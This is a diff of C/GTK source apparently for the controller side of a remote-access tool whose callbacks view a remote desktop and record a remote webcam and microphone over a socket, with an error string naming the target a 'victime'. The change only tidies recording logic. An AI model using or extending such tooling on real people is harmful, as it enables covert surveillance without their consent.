@@ -24,9 +24,6 @@ uint16_t port;
 
 GtkWidget *text_view;
 
-static int on_video = 0;
-
-
 void cb_watch_remote_desktop(GtkButton *button, gpointer user_data)
 {
     GtkWidget *IP_dialog = NULL;
@@ -171,6 +168,7 @@ void cb_watch_remote_desktop(GtkButton *button, gpointer user_data)
     return;
 }
 
+//gst-launch filesrc location=output.mp4 typefind=true ! aiurdemux name=demux demux. ! queue max-size-buffers=0 max-size-time=0 ! mfw_isink axis-left=0 axis-top=0 disp-width=720 disp-height=480 demux. ! queue max-size-buffers=0 max-size-time=0 ! audioconvert ! ‘audio/x-raw-int,channels=2’ ! alsasink
 
 void cb_stream_the_webcam(GtkButton *button, gpointer user_data)
 {
@@ -364,8 +362,6 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
     long tailleBlockRecut = 0;
     long data_len = 0;
     long totalRcv = 0;
-    
-    on_video = 1;
 
     //gst-launch-1.0 -v v4l2src device=/dev/video0 num-buffers=500 ! "video/x-raw,width=1440,framerate=30/1" ! videorate ! "video/x-raw,framerate=30/1" ! jpegenc ! avimux ! filesink location=output.avi
 
@@ -475,26 +471,12 @@ void cb_record_webcam(GtkButton *button, gpointer user_data)
         error("send() final_victime_cmd", "cb_record_webcam()");
         exit(-1);
     }
-    
-    if(on_video == 0)
-    {
-        record = fopen("output.wav", "wb");
-        if(record == NULL)
-        {
-            error("fopen() output.wav", "cb_record_micro()");
-            exit(-1);
-        }
-    }
 
-    if(on_video == 1)
+    record = fopen("output.avi", "wb");
+    if(record == NULL)
     {
-        record = fopen("output.avi", "wb");
-        if(record == NULL)
-        {
-            error("fopen() output.avi", "cb_record_micro()");
-            exit(-1);
-        }
-
+        error("fopen() output.avi", "cb_record_micro()");
+        exit(-1);
     }
 
     if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
@@ -548,7 +530,7 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
     int recorded = 0;
     size_t flag_watch = 17;
    
-    unsigned char buffer[BUFSIZ] = "";
+    char buffer[BUFSIZ] = "";
 
     FILE *record = NULL;
     
@@ -560,8 +542,6 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
     gchar *text = NULL;
     GtkTextIter start;
     GtkTextIter end;
-    
-    on_video = 0;
     
      //"gst-launch-1.0 -v alsasrc num-buffers= 500 ! wavenc ! filesink location=output.wav"
     
@@ -696,7 +676,7 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
     if(recorded == 1)
     {
         /** Obtaining the buffer associated with the widget. **/
-        text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));
+        text_buffer = gtk_text_view_get_buffer((GtkTextView*)text_view);
 
         /** Set the default buffer text. **/
         gtk_text_buffer_set_text(text_buffer, "Audio have been recorded ...", -1);
@@ -723,26 +703,14 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
         }
     }
     
-    if(on_video == 0)
+
+    record = fopen("output.wav", "wb");
+    if(record == NULL)
     {
-        record = fopen("output.wav", "wb");
-        if(record == NULL)
-        {
-            error("fopen() output.wav", "cb_record_micro()");
-            exit(-1);
-        }
+        error("fopen() output.wav", "cb_record_micro()");
+        exit(-1);
     }
 
-    if(on_video == 1)
-    {
-        record = fopen("output.avi", "wb");
-        if(record == NULL)
-        {
-            error("fopen() output.avi", "cb_record_micro()");
-            exit(-1);
-        }
-
-    }
 
     if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
     {
@@ -764,7 +732,7 @@ void cb_record_micro(GtkButton *button, gpointer user_data)
 
     }while(totalRcv < data_len);
 
-    printf("Reception du fichier video success : %ld !!\n", totalRcv);
+    printf("Reception du fichier audio success : %ld !!\n", totalRcv);
 
     /* unused parameters */
     (void)button;
